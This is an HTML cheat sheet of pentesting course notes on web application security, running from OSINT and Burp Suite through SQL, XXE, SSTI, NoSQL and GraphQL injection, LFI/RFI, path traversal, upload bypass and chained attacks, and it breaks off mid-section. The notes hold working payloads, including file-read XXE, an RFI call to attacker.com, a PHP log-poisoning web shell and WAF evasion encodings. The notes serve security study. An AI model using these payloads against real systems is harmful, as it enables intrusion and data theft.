<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Module1</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    
<style>
    :root {
        --bg-primary: #0a0a0f;
        --bg-secondary: #12121a;
        --bg-code: #1a1a24;
        --accent: #00ff88;
        --accent-dim: #00cc6a;
        --text: #e4e4e7;
        --text-dim: #a1a1aa;
        --border: #27272a;
    }
    
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
        font-family: 'Segoe UI', system-ui, sans-serif;
        background: var(--bg-primary);
        color: var(--text);
        line-height: 1.8;
        padding: 40px 20px;
        max-width: 900px;
        margin: 0 auto;
    }
    
    .back-link {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        color: var(--accent);
        text-decoration: none;
        font-size: 0.875rem;
        margin-bottom: 32px;
        padding: 8px 16px;
        background: var(--bg-secondary);
        border-radius: 8px;
        border: 1px solid var(--border);
        transition: all 0.3s;
    }
    
    .back-link:hover {
        background: var(--bg-code);
        border-color: var(--accent);
    }
    
    h1 {
        font-size: 2.5rem;
        margin-bottom: 16px;
        color: var(--text);
        border-bottom: 2px solid var(--accent);
        padding-bottom: 16px;
    }
    
    h2 {
        font-size: 1.75rem;
        margin: 48px 0 16px;
        color: var(--text);
        display: flex;
        align-items: center;
        gap: 12px;
    }
    
    h2::before {
        content: '##';
        color: var(--accent);
        font-family: monospace;
        font-size: 1rem;
    }
    
    h3 {
        font-size: 1.25rem;
        margin: 32px 0 12px;
        color: var(--text-dim);
    }
    
    p { margin-bottom: 16px; }
    
    a {
        color: var(--accent);
        text-decoration: none;
        border-bottom: 1px solid transparent;
        transition: border-color 0.3s;
    }
    
    a:hover { border-bottom-color: var(--accent); }
    
    img {
        max-width: 100%;
        height: auto;
        border-radius: 12px;
        margin: 24px 0;
        border: 1px solid var(--border);
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
    }
    
    code {
        font-family: 'JetBrains Mono', 'Fira Code', monospace;
        background: var(--bg-code);
        padding: 2px 8px;
        border-radius: 4px;
        font-size: 0.9em;
        color: var(--accent);
        border: 1px solid var(--border);
    }
    
    pre {
        background: var(--bg-secondary);
        padding: 20px;
        border-radius: 12px;
        overflow-x: auto;
        margin: 24px 0;
        border: 1px solid var(--border);
        position: relative;
    }
    
    pre::before {
        content: 'terminal';
        position: absolute;
        top: 8px;
        right: 12px;
        font-size: 0.75rem;
        color: var(--text-dim);
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    
    pre code {
        background: none;
        padding: 0;
        border: none;
        color: var(--text);
    }
    
    blockquote {
        border-left: 3px solid var(--accent);
        padding-left: 20px;
        margin: 24px 0;
        color: var(--text-dim);
        font-style: italic;
    }
    
    ul, ol {
        margin: 16px 0 16px 24px;
    }
    
    li {
        margin-bottom: 8px;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        margin: 24px 0;
    }
    
    th, td {
        padding: 12px 16px;
        text-align: left;
        border: 1px solid var(--border);
    }
    
    th {
        background: var(--bg-secondary);
        color: var(--accent);
        font-weight: 600;
    }
    
    tr:nth-child(even) { background: var(--bg-secondary); }
    
    hr {
        border: none;
        height: 1px;
        background: var(--border);
        margin: 40px 0;
    }
    
    .meta {
        display: flex;
        gap: 24px;
        margin-bottom: 32px;
        padding: 16px;
        background: var(--bg-secondary);
        border-radius: 8px;
        font-size: 0.875rem;
        color: var(--text-dim);
    }
    
    .meta-item {
        display: flex;
        align-items: center;
        gap: 6px;
    }
</style>

</head>
<body>
    <a href="../../index.html" class="back-link">‚Üê Back to Index</a>
    <div class="meta">
        <span class="meta-item">üìÖ Updated: 2025-12-30</span>
        <span class="meta-item">üìÇ CheatSheets</span>
    </div>
    <article>
        <h1>Module1</h1>

<h2>Web Application Core Components</h2>

<table>
<thead>
<tr>
  <th>Component</th>
  <th>Function</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Web Server</td>
  <td>Accepts user requests, directs to correct destination</td>
</tr>
<tr>
  <td>Application Server</td>
  <td>Handles processing tasks, delivers responses</td>
</tr>
<tr>
  <td>Database</td>
  <td>Stores, retrieves, organizes application data</td>
</tr>
</tbody>
</table>

<h2>Web Application Architecture Layers</h2>

<table>
<thead>
<tr>
  <th>Layer</th>
  <th>Components</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Presentation Layer</td>
  <td>Web Server</td>
</tr>
<tr>
  <td>Business Layer</td>
  <td>API Layer (Web Services API), App (Business Logic), Back End (Legacy Application, Enterprise Information System)</td>
</tr>
<tr>
  <td>Data Layer</td>
  <td>Database Service, Third Party Service</td>
</tr>
</tbody>
</table>

<h2>OWASP Resources</h2>

<table>
<thead>
<tr>
  <th>Resource</th>
  <th>Description</th>
</tr>
</thead>
<tbody>
<tr>
  <td>OWASP Top 10</td>
  <td>Top 10 most exploited vulnerabilities (Web Apps, API, LLM, CI/CD) - Release cycle: every 4 years</td>
</tr>
<tr>
  <td>WSTG</td>
  <td>Web Security Testing Guide - methodologies, techniques, checklists for web app vulnerability testing</td>
</tr>
</tbody>
</table>

<h1>Module2</h1>

<h2>Burp Suite</h2>

<p><strong>Developer:</strong> PortSwigger</p>

<p><strong>Core Tools:</strong></p>

<table>
<thead>
<tr>
  <th>Tool</th>
  <th>Function</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Proxy</td>
  <td>Intercepts requests, forwards to destination server. Inspect &amp; modify HTTP(S) traffic</td>
</tr>
<tr>
  <td>Intruder</td>
  <td>Automated requests with customizable payloads. Used for SQLi testing, brute-forcing credentials</td>
</tr>
<tr>
  <td>Repeater</td>
  <td>Manually modify &amp; resend HTTP/WebSocket requests repeatedly. Test different input values</td>
</tr>
<tr>
  <td>Scanner</td>
  <td>Automated vulnerability scanning (Pro)</td>
</tr>
<tr>
  <td>Collaborator</td>
  <td>Out-of-band interaction detection (Pro)</td>
</tr>
<tr>
  <td>Extender</td>
  <td>Add extensions/plugins</td>
</tr>
</tbody>
</table>

<h2>Nuclei</h2>

<p><strong>Developer:</strong> ProjectDiscovery</p>

<p><strong>Type:</strong> Fast, community-driven vulnerability scanner using YAML-based DSL</p>

<p><strong>Scan Targets:</strong> Applications, APIs, Networks, DNS, Cloud</p>

<p><strong>Nuclei Templates:</strong></p>

<ul>
<li>YAML-based vulnerability detection scripts</li>
<li>Contain logic to detect security vulnerabilities</li>
<li>Several thousand community-contributed templates available</li>
</ul>

<h1>Module 3</h1>

<h2>OSINT (Open Source Intelligence)</h2>

<p><strong>Definition:</strong> Extracting actionable intel from publicly available sources via passive means</p>

<p><strong>Sources:</strong> Online &amp; Offline</p>

<p><strong>Use Cases:</strong> Reconnaissance, Attack Planning, Compatibility Checks</p>

<p><strong>Goal:</strong> Identify technologies, versions, and configurations of targets</p>

<h1>Module 4</h1>

<h2>OSINT Techniques</h2>

<h3>DNS (Domain Name System)</h3>

<ul>
<li>Maps IP addresses to domains and vice versa</li>
<li>Provides critical insights into client's attack surface</li>
<li><strong>Tool:</strong> DNSDumpster</li>
</ul>

<h3>Subdomain Enumeration</h3>

<ul>
<li>Used for integrating third-party services</li>
<li>Provides additional targets</li>
<li>Orphaned subdomains often found in the wild</li>
<li>Often act as initial entry point into client's infrastructure</li>
<li><strong>Tool:</strong> Crt.sh (Certificate Transparency logs)</li>
</ul>

<h3>WHOIS</h3>

<ul>
<li>Query-Response protocol</li>
<li>Lookups: Domain names, IP addresses, ASNs</li>
<li>Provides: Ownership and registration data</li>
<li><strong>Tool:</strong> Whois.com</li>
</ul>

<h3>Google Dorking</h3>

<ul>
<li>Extract information using Google's search operators</li>
<li>Simple to complex piped (|) queries</li>
<li><strong>Resource:</strong> Google Hacking Database (GHDB)</li>
</ul>

<p><strong>Example Dorks:</strong></p>

<pre><code>inurl:/wp-content/uploads/ ext:txt "username" | "user name" | "uname"
intitle:"Index of" inurl:/backup/ "admin.zip"
</code></pre>

<h2>OSINT Resources</h2>

<table>
<thead>
<tr>
  <th>Technique</th>
  <th>Tool/Resource</th>
</tr>
</thead>
<tbody>
<tr>
  <td>DNS Recon</td>
  <td>DNSDumpster</td>
</tr>
<tr>
  <td>Subdomain</td>
  <td>Crt.sh</td>
</tr>
<tr>
  <td>WHOIS</td>
  <td>Whois.com</td>
</tr>
<tr>
  <td>Google Dorking</td>
  <td>Google Hacking Database (GHDB)</td>
</tr>
</tbody>
</table>

<h2>FFUF (Fuzz Faster U Fool)</h2>

<p><strong>Purpose:</strong> Fast discovery of hidden resources</p>

<p><strong>Capabilities:</strong></p>

<ul>
<li>High-speed directory and file fuzzing using wordlists</li>
<li>Fuzzing parameters</li>
<li>Fuzzing headers</li>
<li>Fuzzing POST data</li>
</ul>

<h1>Module 5</h1>

<h2>WAF (Web Application Firewall)</h2>

<p><strong>Definition:</strong> Application-level firewall that monitors, filters, and blocks HTTP(S) traffic to and from a web service</p>

<p><strong>Purpose:</strong> Blocking malicious payloads by threat actors</p>

<h2>WAF Bypass Techniques</h2>

<table>
<thead>
<tr>
  <th>Technique</th>
  <th>Description</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Regex Bypass</td>
  <td>Craft alternative syntax to evade regex patterns</td>
</tr>
<tr>
  <td>URL Encoding</td>
  <td><code>&lt;script&gt;</code> ‚Üí <code>%3Cscript%3E</code></td>
</tr>
<tr>
  <td>Double Encoding</td>
  <td><code>&lt;</code> ‚Üí <code>%253C</code></td>
</tr>
<tr>
  <td>Wildcard Obfuscation</td>
  <td>Use wildcards in payloads</td>
</tr>
<tr>
  <td>Mixed Encoding</td>
  <td>Combine different encoding methods</td>
</tr>
<tr>
  <td>Case Changing</td>
  <td><code>&lt;ScRiPt&gt;</code>, <code>SeLeCt</code>, <code>UniOn</code></td>
</tr>
<tr>
  <td>Content-Type Manipulation</td>
  <td>Change Content-Type header, add different character sets</td>
</tr>
<tr>
  <td>Header Modification</td>
  <td>Modify HTTP headers to bypass rules</td>
</tr>
</tbody>
</table>

<h1>Module 6</h1>

<h2>SQL 101</h2>

<p><strong>Definition:</strong> Structured Query Language - standardized language for relational databases</p>

<p><strong>Examples:</strong> MySQL, MS-SQL, PostgreSQL</p>

<h3>SQL Components</h3>

<table>
<thead>
<tr>
  <th>Component</th>
  <th>Description</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Tables</td>
  <td>Organizes data into rows (records) and columns (attributes)</td>
</tr>
<tr>
  <td>Statements</td>
  <td>Commands that RDBMS understand and execute</td>
</tr>
<tr>
  <td>Stored Procedures</td>
  <td>Predefined collection of SQL statements saved in database</td>
</tr>
</tbody>
</table>

<h3>SQL Clauses</h3>

<table>
<thead>
<tr>
  <th>Clause</th>
  <th>Function</th>
</tr>
</thead>
<tbody>
<tr>
  <td>WHERE</td>
  <td>Filter records</td>
</tr>
<tr>
  <td>ORDER BY</td>
  <td>Sort results</td>
</tr>
<tr>
  <td>GROUP BY</td>
  <td>Aggregate rows</td>
</tr>
<tr>
  <td>HAVING</td>
  <td>Apply conditions on groups</td>
</tr>
<tr>
  <td>LIMIT</td>
  <td>Restrict number of results</td>
</tr>
</tbody>
</table>

<h3>SQL Operators</h3>

<p><strong>Comparison:</strong> <code>=</code>, <code>!=</code>, <code>&lt;&gt;</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></p>

<p><strong>Logical:</strong> <code>AND</code>, <code>OR</code>, <code>NOT</code></p>

<p><strong>Other:</strong> <code>IN</code>, <code>BETWEEN</code>, <code>LIKE</code>, <code>IS NULL</code>, <code>IS NOT NULL</code></p>

<h3>CRUD Operations</h3>

<pre><code>-- CREATE (INSERT)
INSERT INTO Products (ProductID, ProductName, Price) VALUES (1001, 'Mattress', 499);

-- READ (SELECT)
SELECT * FROM Products;
SELECT ProductName, Price FROM Products;
SELECT * FROM Products WHERE Price &gt; 300;

-- UPDATE
UPDATE Products SET Price = 599 WHERE ProductID = 1001;

-- DELETE
DELETE FROM Products WHERE ProductID = 1001;
</code></pre>

<h2>SQL Injection (SQLi)</h2>

<p><strong>Definition:</strong> User-supplied input improperly incorporated into database queries, allowing manipulation of SQL statements</p>

<h3>Types of SQLi</h3>

<table>
<thead>
<tr>
  <th>Type</th>
  <th>Subtype</th>
  <th>Description</th>
  <th>Payload Example</th>
</tr>
</thead>
<tbody>
<tr>
  <td>In-Band</td>
  <td>Error-Based</td>
  <td>Forces verbose error messages revealing DB details</td>
  <td><code>' OR 1=1--</code></td>
</tr>
<tr>
  <td>In-Band</td>
  <td>Union-Based</td>
  <td>Uses UNION to extract additional data</td>
  <td><code>' UNION SELECT username, password FROM users--</code></td>
</tr>
<tr>
  <td>Blind</td>
  <td>Boolean-Based</td>
  <td>Infers data from true/false response differences</td>
  <td><code>' AND 1=1--</code> (true) / <code>' AND 1=2--</code> (false)</td>
</tr>
<tr>
  <td>Blind</td>
  <td>Time-Based</td>
  <td>Uses time delays to infer data</td>
  <td><code>' OR IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--</code></td>
</tr>
</tbody>
</table>

<h2>XXE (XML External Entity) Injection</h2>

<p><strong>Definition:</strong> Occurs when application improperly processes XML input containing external entity references</p>

<h3>Types of XXE</h3>

<p><strong>Classic XXE:</strong></p>

<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;
</code></pre>

<p><strong>Error-Based XXE:</strong></p>

<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///nonexistentfile"&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;
</code></pre>

<p><strong>Blind XXE (OOB):</strong></p>

<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "https://webhook.site/&lt;UUID&gt;"&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;
</code></pre>

<h2>OS Command Injection</h2>

<table>
<thead>
<tr>
  <th>Type</th>
  <th>Description</th>
  <th>Example</th>
</tr>
</thead>
<tbody>
<tr>
  <td>OS Command Injection</td>
  <td>Commands executed in OS context</td>
  <td><code>whoami</code>, <code>printenv</code></td>
</tr>
<tr>
  <td>Component Command Injection</td>
  <td>Commands executed in protocol/interpreter context</td>
  <td><code>python3 revshell.py</code></td>
</tr>
</tbody>
</table>

<h2>SSTI (Server-Side Template Injection)</h2>

<p><strong>Definition:</strong> User-supplied input unsafely integrated into server-side template, allowing injection of arbitrary template expressions.</p>

<h2>NoSQL Injection</h2>

<p><strong>Definition:</strong> Untrusted user-input inserted into NoSQL queries, manipulating database operations</p>

<p><strong>Common Target:</strong> JSON-based applications (e.g., MongoDB in MEAN stack)</p>

<p><strong>Impact:</strong> Authentication bypass, data exfiltration</p>

<h3>Payloads</h3>

<pre><code>// Boolean-Based
{ "owner": { "$ne": "" } }

// Error-Based
{ "owner": { "$abcd": "123" } }
</code></pre>

<h2>SQL Injection Payloads</h2>

<h3>In-Band SQLi - Authentication Bypass</h3>

<p>json</p>

<pre><code>{"username": "admin' --", "password": "anything"}
</code></pre>

<h3>Error-Based SQLi - Column Enumeration</h3>

<p>json</p>

<pre><code>{"username": "admin' OR 1=1 ORDER BY 100--", "password": "anything"}
</code></pre>

<h3>Boolean-Based Blind SQLi</h3>

<p>json</p>

<pre><code>// True condition (auth succeeds)
{"username": "admin' AND 1=1--", "password": "anything"}

// False condition (auth fails)
{"username": "admin' AND 1=2--", "password": "anything"}
</code></pre>

<h3>Time-Based Blind SQLi (PostgreSQL)</h3>

<p>json</p>

<pre><code>{"username": "admin' OR 1=1; SELECT pg_sleep(5)--", "password": "anything"}
</code></pre>

<h3>Union-Based SQLi - Column Count</h3>

<p>json</p>

<pre><code>// Increment NULLs until no error
{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL--", "password": "anything"}

// 8 columns found
{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "password": "anything"}
</code></pre>

<hr />

<h2>XXE Injection Payloads</h2>

<h3>Classic XXE - File Read</h3>

<p>xml</p>

<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE statement [
&lt;!ENTITY account SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;statement&gt;
&lt;customer&gt;John Doe&lt;/customer&gt;
&lt;account&gt;&amp;account;&lt;/account&gt;
&lt;/statement&gt;
</code></pre>

<h3>Error-Based XXE</h3>

<p>xml</p>

<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE statement [
 &lt;!ENTITY boom SYSTEM "file:///root/secret_file"&gt;
]&gt;
&lt;statement&gt;
 &lt;customer&gt;Jane Smith&lt;/customer&gt;
 &lt;account&gt;&amp;boom;&lt;/account&gt;
&lt;/statement&gt;
```

---

## Command Injection Payloads

**Test Payloads:**
```
ls
id
whoami
</code></pre>

<hr />

<h2>SSTI Payloads</h2>

<h3>Detection</h3>

<p>json</p>

<pre><code>{"to_account":"as", "amount":"1", "description":"{{7*7}}"}
```

*Check if `49` appears in response*

### File Read (Jinja2/Flask)
```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
</code></pre>

<hr />

<h2>NoSQL Injection Payloads</h2>

<h3>Boolean-Based (Operator Injection)</h3>

<p>json</p>

<pre><code>{ "owner": { "$ne": "" } }
</code></pre>

<h3>Regex-Based (Wildcard)</h3>

<p>json</p>

<pre><code>{ "owner": { "$regex": ".*" } }
</code></pre>

<h3>OR-Based (Always True)</h3>

<p>json</p>

<pre><code>{
 "$or": [
   { "owner": "admin" },
   { "owner": { "$ne": "admin" } }
 ]
}
</code></pre>

<h3>Error-Based (Invalid Operator)</h3>

<p>json</p>

<pre><code>{ "owner": { "$abcd": "123" } }
</code></pre>

<hr />

<h2>GraphQL Injection Payloads</h2>

<h3>Error-Based</h3>

<p>json</p>

<pre><code>{"query":"{ user(username:\"qwe'\") { id username balance } }"}
</code></pre>

<h3>Boolean-Based</h3>

<p>json</p>

<pre><code>// True condition
{"query":"{ user(username:\"test' AND '2'='2\") { id username balance } }"}

// False condition
{"query":"{ user(username:\"test' AND '2'='1\") { id username balance } }"}
</code></pre>

<h3>Introspection (Schema Dump)</h3>

<p>json</p>

<pre><code>{"query":"{ __schema { types { name fields { name } } } }"}
</code></pre>

<h3>Unauthorized Access</h3>

<p>json</p>

<pre><code>{"query":"{ user(username:\"admin\") { id username balance } }"}
</code></pre>

<h1>Module 7</h1>

<h2>Authentication vs Authorization</h2>

<table>
<thead>
<tr>
  <th>Concept</th>
  <th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Authentication (AuthN)</td>
  <td>Process of verifying the identity of a user</td>
</tr>
<tr>
  <td>Authorization (AuthZ)</td>
  <td>Process of verifying whether the authenticated user has privileges for certain operations</td>
</tr>
</tbody>
</table>

<h2>Brute Force Attacks</h2>

<p><strong>Definition:</strong> Manual/automated guessing of credentials or tokens</p>

<p><strong>Targets:</strong> Login forms, API auth endpoints, Password reset flows</p>

<h3>Types of Brute Force Attacks</h3>

<p>Simple Brute Force, Dictionary Attack, Credential Stuffing, Reverse Brute Force, Hybrid Brute Force</p>

<h2>Session Management</h2>

<p><strong>Definition:</strong> Web applications manage persistent user interactions &amp; associated privileges using sessions</p>

<p><strong>Handled via:</strong> Cookies, JWT tokens</p>

<h3>Session Management Components</h3>

<p>Session ID Generation, Session Storage, Session Transmission, Session Expiration, Session Termination</p>

<h3>Broken Session Attacks</h3>

<table>
<thead>
<tr>
  <th>Attack</th>
  <th>Description</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Session Hijacking</td>
  <td>Attacker takes over a valid user session to act as that user</td>
</tr>
<tr>
  <td>Session Fixation</td>
  <td>Attacker sets/supplies a session ID that victim later authenticates with</td>
</tr>
<tr>
  <td>Cookie Manipulation</td>
  <td>Attacker manipulates session cookies to impersonate another session</td>
</tr>
</tbody>
</table>

<h2>IDOR (Insecure Direct Object Reference)</h2>

<p><strong>Definition:</strong> Vulnerability where applications authorize access using user-supplied identifiers without proper validation</p>

<p><strong>Impact:</strong> Data exposure, Privilege escalation</p>

<h3>Types of IDOR</h3>

<table>
<thead>
<tr>
  <th>Type</th>
  <th>Description</th>
  <th>Example</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Horizontal IDOR</td>
  <td>Access another user's data (same privilege level)</td>
  <td><code>user_id=1001</code> ‚Üí <code>user_id=1002</code></td>
</tr>
<tr>
  <td>Vertical IDOR</td>
  <td>Gain higher-level access (crosses privilege boundaries)</td>
  <td><code>role=user</code> ‚Üí <code>role=admin</code></td>
</tr>
</tbody>
</table>

<h2>OAuth (Open Authorization)</h2>

<p><strong>Definition:</strong> Standard protocol that lets users grant third-party apps controlled access to their resources without exposing passwords</p>

<p><strong>Features:</strong></p>

<ul>
<li>Grants limited access to resources</li>
<li>Can be revoked easily</li>
</ul>

<h3>OAuth Flow</h3>

<p>User requests access -> Application redirects to Authorization Server -> User authenticates &amp; grants permission -> Authorization Server returns authorization code -> Application exchanges code for access token -> Application uses token to access resources</p>

<h2>JWT (JSON Web Tokens)</h2>

<p><strong>Definition:</strong> Compact, self-contained token format for exchanging claims between parties</p>

<p><strong>Features:</strong>
Lightweight, Can be sent in headers, URLs, or requests, Contains all info needed to verify user without database lookup</p>

<h3>JWT Structure</h3>

<pre><code>HEADER.PAYLOAD.SIGNATURE
</code></pre>

<table>
<thead>
<tr>
  <th>Part</th>
  <th>Content</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Header</td>
  <td>Algorithm &amp; token type (<code>{"alg":"HS256","typ":"JWT"}</code>)</td>
</tr>
<tr>
  <td>Payload</td>
  <td>Claims (user data, expiration, etc.)</td>
</tr>
<tr>
  <td>Signature</td>
  <td>Verification signature</td>
</tr>
</tbody>
</table>

<h3>JWT Flow</h3>

<p>Client sends credentials -> Server validates &amp; generates JWT -> Server returns JWT to client -> Client stores JWT -> Client sends JWT with subsequent requests -> Server validates JWT signature &amp; processes request</p>

<h1>Module 8</h1>

<h2>Insecure Deserialization</h2>

<h3>Serialization vs Deserialization</h3>

<table>
<thead>
<tr>
  <th>Process</th>
  <th>Description</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Serialization</td>
  <td>Object ‚Üí Stream of Bytes (for storage/transmission)</td>
</tr>
<tr>
  <td>Deserialization</td>
  <td>Stream of Bytes ‚Üí Object (reconstruction)</td>
</tr>
</tbody>
</table>

<p><strong>Storage:</strong> File, DB, Memory, Socket</p>

<h3>Insecure Deserialization</h3>

<p><strong>Definition:</strong> Application deserializes user-supplied data without validation</p>

<p><strong>Impact:</strong> Code execution, Data corruption, Privilege escalation</p>

<h3>Attack Flow</h3>

<p><strong>Safe Flow:</strong></p>

<pre><code>Client: {"class":"UserPrefs","theme":"dark","lang":"en"}
  ‚Üí Server: deserialize(payload) ‚Üí instantiate UserPrefs ‚Üí apply settings
</code></pre>

<p><strong>Attack Scenario (Object Injection):</strong></p>

<pre><code>Attacker: {"class":"ExploitGadget","cmd":"rm -rf /tmp/flag"}
  ‚Üí Server: deserialize(payload) ‚Üí instantiate ExploitGadget ‚Üí gadget.run() (side-effect)
</code></pre>

<p><em>Attack executes during deserialization, before application-level checks</em></p>

<hr />

<h2>SSRF (Server-Side Request Forgery)</h2>

<p><strong>Definition:</strong> Application fetches user-supplied URL, allowing attacker to trick server into making unintended requests</p>

<p><strong>Impact:</strong> Access internal-only resources (cloud metadata endpoints, internal APIs, localhost services)</p>

<h3>Common SSRF Targets</h3>

<pre><code>http://127.0.0.1/admin
http://localhost/admin
http://169.254.169.254/latest/meta-data/  (AWS metadata)
http://[::1]/admin  (IPv6 localhost)
</code></pre>

<hr />

<h2>File Inclusion</h2>

<p><strong>Definition:</strong> Application loads file path from user input and includes/executes that file on server</p>

<p><strong>Impact:</strong> RCE, Sensitive info disclosure, Persistence</p>

<h3>Types of File Inclusion</h3>

<table>
<thead>
<tr>
  <th>Type</th>
  <th>Description</th>
  <th>Source</th>
</tr>
</thead>
<tbody>
<tr>
  <td>LFI (Local File Inclusion)</td>
  <td>Loads and executes files from server's local filesystem</td>
  <td>Server</td>
</tr>
<tr>
  <td>RFI (Remote File Inclusion)</td>
  <td>Loads and executes file from external attacker-controlled source</td>
  <td>External</td>
</tr>
</tbody>
</table>

<h3>Common LFI Payloads</h3>

<pre><code>?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd%00
?page=php://filter/convert.base64-encode/resource=index.php
</code></pre>

<h3>RFI Payloads</h3>

<pre><code>?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
</code></pre>

<hr />

<h2>Path Traversal</h2>

<p><strong>Definition:</strong> Application improperly fetches and processes arbitrary files, returns contents to frontend</p>

<p><strong>Impact:</strong> Disclosure of configuration files, source code, credentials</p>

<h3>Path Traversal Payloads</h3>

<pre><code>../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
</code></pre>

<p><strong>Example:</strong></p>

<pre><code>Normal:  /loadImage?filename=gift.png
Attack:  /loadImage?filename=../../../etc/passwd
</code></pre>

<hr />

<h2>Prototype Pollution</h2>

<p><strong>Definition:</strong> JavaScript vulnerability where attacker can modify the prototype of a base object (Object.prototype)</p>

<p><strong>Impact:</strong> Injected properties become visible on all objects, changing application behavior globally</p>

<h3>Attack Vector</h3>

<p>javascript</p>

<pre><code>// Attacker input
{"__proto__": {"isAdmin": true}}

// OR via URL
?__proto__[isAdmin]=true
```

### Attack Flow
```
Attacker input: __proto__.transport_url=evil-user.net
  ‚Üí recursiveMerge() processes input
  ‚Üí Object.prototype.transport_url = 'evil-user.net'
  ‚Üí All objects inherit this property
</code></pre>

<h3>Common Payloads</h3>

<p>json</p>

<pre><code>{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

---

## File Upload Bypass

**Definition:** Application's file upload filtering/validation is circumvented

**Impact:** Upload executable code, web shells, malicious files

### Bypass Techniques

| Technique | Example |
|-----------|---------|
| Double extension | `shell.php.png` ‚Üí server strips `.png` ‚Üí `shell.php` |
| Null byte | `shell.php%00.png` |
| Case manipulation | `shell.PhP` |
| Content-Type manipulation | Change `application/x-php` ‚Üí `image/png` |
| Magic bytes | Add PNG header (`\x89PNG`) to PHP file |
| Alternative extensions | `.php5`, `.phtml`, `.phar`, `.inc` |

### Upload Bypass Flow
```
1. Upload: backdoor.php.png
2. Server validation: sees .png ‚Üí allows
3. Server processing: strips extension or uses first extension
4. Result: backdoor.php executed
```

### Common Dangerous Extensions
```
PHP: .php, .php5, .phtml, .phar
ASP: .asp, .aspx
JSP: .jsp, .jspx
Other: .cgi, .pl, .py
</code></pre>

<h1>Module 9</h1>

<h2>Chained Attacks Overview</h2>

<p>Chained attacks combine multiple vulnerabilities to escalate impact. Understanding attack chains is critical for both exploitation and defense.</p>

<h3>Chain 1: LFI ‚Üí Log Poisoning ‚Üí RCE</h3>

<p><strong>Attack Flow:</strong></p>

<pre><code>Web Application ‚Üí Local File Read (LFI) ‚Üí Log Poisoning ‚Üí RCE
</code></pre>

<p><strong>Steps:</strong></p>

<ol>
<li>Identify LFI vulnerability (e.g., <code>?page=../../../etc/passwd</code>)</li>
<li>Confirm ability to read log files (Apache/Nginx access logs)</li>
<li>Inject PHP payload into log via User-Agent or other logged field</li>
<li>Include the poisoned log file via LFI to execute payload</li>
</ol>

<p><strong>Common Log Paths:</strong></p>

<pre><code>/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
/proc/self/environ
</code></pre>

<p><strong>Log Poisoning Payload (User-Agent):</strong></p>

<pre><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
</code></pre>

<p><strong>Trigger RCE:</strong></p>

<pre><code>?page=../../../var/log/apache2/access.log&amp;cmd=id
</code></pre>

<h3>Chain 2: SQL Injection ‚Üí XXE ‚Üí RCE</h3>

<p><strong>Attack Flow:</strong></p>

<pre><code>SQL Injection ‚Üí Admin Access ‚Üí XXE Injection ‚Üí SQL Injection ‚Üí RCE
</code></pre>

<p><strong>Steps:</strong></p>

<ol>
<li>Exploit SQLi to bypass authentication or extract admin credentials</li>
<li>Access admin panel/functionality</li>
<li>Find XML processing feature in admin area</li>
<li>Exploit XXE to read sensitive files or chain to further SQLi</li>
<li>Achieve RCE through file write or additional exploitation</li>
</ol>

<h3>Chain 3: JWT KID Header Injection ‚Üí SSRF</h3>

<p><strong>Attack Flow:</strong></p>

<pre><code>Web Application ‚Üí JWT Token (KID parameter) ‚Üí SSRF
</code></pre>

<p><strong>Concept:</strong></p>

<ul>
<li>JWT <code>kid</code> (Key ID) header specifies which key to use for signature verification</li>
<li>If application fetches key from URL based on <code>kid</code> value, attacker can inject arbitrary URLs</li>
</ul>

<p><strong>Malicious JWT Header:</strong></p>

<pre><code>{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "http://internal-server/admin"
}
```

**SSRF Targets:**
```
http://169.254.169.254/latest/meta-data/  (AWS)
http://localhost/admin
http://internal-api/sensitive-endpoint
```

---

### Chain 4: Broken Session Management ‚Üí SSTI ‚Üí RCE

**Attack Flow:**
```
Web Application ‚Üí Broken Session (JWT) ‚Üí SSTI ‚Üí RCE
```

**Steps:**
